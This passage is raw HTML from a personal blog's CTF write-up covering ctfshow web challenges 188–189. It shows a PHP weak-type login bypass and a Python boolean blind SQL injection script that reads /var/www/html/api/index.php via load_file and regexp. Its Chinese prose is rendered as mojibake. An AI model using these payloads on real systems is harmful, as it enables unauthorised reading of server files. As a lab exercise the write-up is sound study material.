class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>&#125;<br><br><span class="hljs-comment">//å¯†ç æ£€æµ‹</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>))&#123;<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>&#125;<br><br><span class="hljs-comment">//å¯†ç åˆ¤æ–­	</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]==<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$password</span>))&#123;	<span class="hljs-comment">//phpä¸­å¦‚æœå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ä¸ºå…¶ä»–æ•°å­—ï¼Œåˆ™ä¸0è‹¥æ¯”è¾ƒæ’ç­‰</span><br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;data&#x27;</span>], <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;flag&#x27;</span>=&gt;<span class="hljs-variable">$flag</span>));<br>  &#125;<br>    <br></code></pre></td></tr></table></figure>

<p><strong>å½“ä¸€ä¸ªå­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒæ—¶ä¼šæŠŠå­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å­—ï¼Œå¦‚ <code>&#39;4ad&#39;=4</code></strong><br><strong>è€Œå½“æ•°å­—ä¸º0ï¼Œä¸”å­—ç¬¦ä¸²å¼€å¤´ä¸ä¸ºå…¶ä»–æ•°å­—æ—¶ï¼Œå¼±ç±»å‹æ’æˆç«‹</strong></p>
<p>payloadï¼š</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">å­—ç¬¦å¼€å¤´ä¼šè¢«å½“ä½œ <span class="hljs-number">0</span><br>æ‰€ä»¥å½“ username = <span class="hljs-number">0</span> æ—¶ ä¼šè¿”å›åˆ— pass ä¸­æ‰€æœ‰ä»¥å­—ç¬¦å¼€å¤´çš„å€¼<br><br><br><span class="hljs-symbol">username:</span> <span class="hljs-number">0</span><br><span class="hljs-symbol">password:</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-189ï¼ˆsqlç›²æ³¨ã€load-fileå‡½æ•°è¯»å–æ–‡ä»¶ã€ifï¼‰"><a href="#web-189ï¼ˆsqlç›²æ³¨ã€load-fileå‡½æ•°è¯»å–æ–‡ä»¶ã€ifï¼‰" class="headerlink" title="web-189ï¼ˆsqlç›²æ³¨ã€load_fileå‡½æ•°è¯»å–æ–‡ä»¶ã€ifï¼‰"></a>web-189ï¼ˆsqlç›²æ³¨ã€load_fileå‡½æ•°è¯»å–æ–‡ä»¶ã€ifï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select pass from ctfshow_user where username = <span class="hljs-subst">&#123;$username&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ç”¨æˆ·åæ£€æµ‹</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, <span class="hljs-variable">$username</span>))&#123;<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>&#125;<br><br><span class="hljs-comment">//å¯†ç æ£€æµ‹</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>))&#123;<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;</span>;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>&#125;<br><br><span class="hljs-comment">//å¯†ç åˆ¤æ–­</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]==<span class="hljs-variable">$password</span>)&#123;<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;<br>  &#125;<br>    <br></code></pre></td></tr></table></figure>

<p><strong>æ­¤é¢˜æé†’äº†flagåœ¨api&#x2F;index.php, å¤§æ¦‚ç‡å°±æ˜¯è®©ç”¨load_fileæ¥è¯»å–å‡½æ•°</strong></p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pf">// username/<span class="hljs-built_in">pass</span> è¾“å…¥ <span class="hljs-number">0</span>/<span class="hljs-number">0</span> è¾“å‡º å¯†ç é”™è¯¯<br>// username/<span class="hljs-built_in">pass</span> è¾“å…¥ <span class="hljs-number">1</span>/<span class="hljs-number">0</span> è¾“å‡º æŸ¥è¯¢å¤±è´¥<br>æ‰€ä»¥æ­¤é¢˜å­˜åœ¨æ”¯æŒå¸ƒå°”ç›²æ³¨çš„æ¡ä»¶<br><br><br>ä½¿ç”¨ç›²æ³¨, åˆ©ç”¨ä¸Šä¸€é¢˜æåˆ°çš„ç‰¹æ€§,  å½“æŸ¥è¯¢çš„usernameä¸ºå­—æ¯å¼€å¤´æ—¶ä¼šè‡ªåŠ¨è½¬å˜æˆ<span class="hljs-number">0</span>å’Œæ•°å­—å¯¹æ¯”,  é‚£ä¹ˆå¯ä»¥ä¼ å…¥<br><span class="hljs-keyword">user</span> = <span class="hljs-number">0</span> æˆ–è€… <span class="hljs-number">1</span>   (å½“<span class="hljs-keyword">user</span>ä¸º<span class="hljs-number">0</span>æ—¶,  ä¼šæŠ¥é”™ç™»å½•å¤±è´¥,  å½“<span class="hljs-keyword">user</span>ä¸º<span class="hljs-number">1</span>æ—¶,  ä¼šæŠ¥é”™æŸ¥è¯¢å¤±è´¥)<br><span class="hljs-built_in">pass</span> = éšæ„<br></code></pre></td></tr></table></figure>

<p>pythonè„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://742e8e2f-6cee-40c4-a072-e021844a8844.challenge.ctf.show/api/index.php&quot;</span><br>flagstr = <span class="hljs-string">&quot;&#123;abcdefghijklmnopqrstuvwxyz-0123456789&#125;&quot;</span><br><br><br>flag = <span class="hljs-string">&quot;ctfshow&#123;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flagstr:<br>        payload = <span class="hljs-string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="hljs-built_in">format</span>(flag+x)	//å¦‚æœæˆåŠŸåŒ¹é…åˆ°å°±ä¼šä¸º<span class="hljs-number">0</span>ï¼Œç„¶åç”¨æˆ·åå³ä¸º<span class="hljs-number">0</span>ï¼Œå°±ä¼šè¿”å›å¯†ç é”™è¯¯ï¼Œæ²¡åŒ¹é…åˆ°å°±ä¼šè¿”å›<span class="hljs-number">1</span>ï¼Œç„¶åç™»å½•ä¼šè¿”å›æŸ¥è¯¢å¤±è´¥<br>        data = &#123;<span class="hljs-string">&quot;username&quot;</span>:payload,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;<br>        r = requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">r&#x27;\u5bc6\u7801\u9519\u8bef&#x27;</span>) &gt; <span class="hljs-number">0</span>:	//\u5bc6\u7801\u9519\u8befä¸º<span class="hljs-string">&#x27;å¯†ç é”™è¯¯&#x27;</span>çš„unicodeç¼–ç ï¼Œå‰é¢åŠ rå¯ä»¥å–æ¶ˆ\çš„è½¬ä¹‰ä½œç”¨ä½¿å…¶å˜æˆæ™®é€šå­—ç¬¦<br>            flag += x<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure>


      
       <hr><span style="font-style: italic;color: gray;"> è½¬è½½è¯·æ³¨æ˜æ¥æºï¼Œæ¬¢è¿å¯¹æ–‡ç« ä¸­çš„å¼•ç”¨æ¥æºè¿›è¡Œè€ƒè¯ï¼Œæ¬¢è¿æŒ‡å‡ºä»»ä½•æœ‰é”™è¯¯æˆ–ä¸å¤Ÿæ¸…æ™°çš„è¡¨è¾¾ã€‚ </span>
    </div>
</article>





    <div id="comments">
    <script>
        {
            const comments = document.getElementById("comments");
            const script = document.createElement("script");
            script.src = "https://giscus.app/client.js";
            script.setAttribute('data-repo', "MIXBP/MIXBP.github.io");
            script.setAttribute('data-repo-id', "R_kgDONYaZsg");
            script.setAttribute('data-category', "Announcements");
            script.setAttribute('data-category-id', "DIC_kwDONYaZss4ClAnT");
            script.setAttribute('data-mapping', "pathname");
            script.setAttribute('data-strict', "0");
            script.setAttribute('data-reactions-enabled', "1");
            script.setAttribute('data-emit-metadata', "0");
            script.setAttribute('data-input-position', "top");
            script.setAttribute('data-theme', "noborder_dark");
            script.setAttribute('data-lang', "zh-CN");
            script.setAttribute('data-loading', "lazy");
            script.setAttribute('crossorigin', "anonymous");
            script.setAttribute('async', "");
            comments.appendChild(script);
        }
    </script>
</div>



    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    Â©MIXBP 2024
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*æ¸²æŸ“å¯¹åº”çš„è¡¨æ ¼æ ·å¼*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*æ¸²æŸ“æ‰“èµæ ·å¼*/
        

        /*é«˜äº®ä»£ç å—è¡Œå·*/
        

        /*è®¿é—®æ•°é‡*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*ä»£ç é«˜äº®ï¼Œè¡Œå·å¯¹é½*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*æ‰“èµé¡µé¢éšè—ä¸å±•ç¤º*/
    

</script>

<!--åŠ å…¥è¡Œå·çš„é«˜äº®ä»£ç å—æ ·å¼-->

<!--è‡ªå®šä¹‰æ ·å¼è®¾ç½®-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*åˆ—è¡¨æ ·å¼*/
    

    /* èƒŒæ™¯å›¾æ ·å¼ */
    
    #post {
        background: url(/img/background.jpg);
    }
    
    
    #post .index {
        background: url(/img/background2.jpg);
    }
    


    /*å¼•ç”¨å—æ ·å¼*/
    

    /*æ–‡ç« åˆ—è¡¨èƒŒæ™¯å›¾*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.5;
        background: url("/img/bjtp.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>






<div class="mobile-menus-out" >

</div>
<div class="mobile-menus">
    
    
    
    <a class="dynamic-menu " target="_self"   href="https://mixbp.github.io/">MIXBP</a>
    
    
    <a class="dynamic-menu " target="_blank"  href="https://mixbp.github.io/">github</a>
    
</div>


</html>
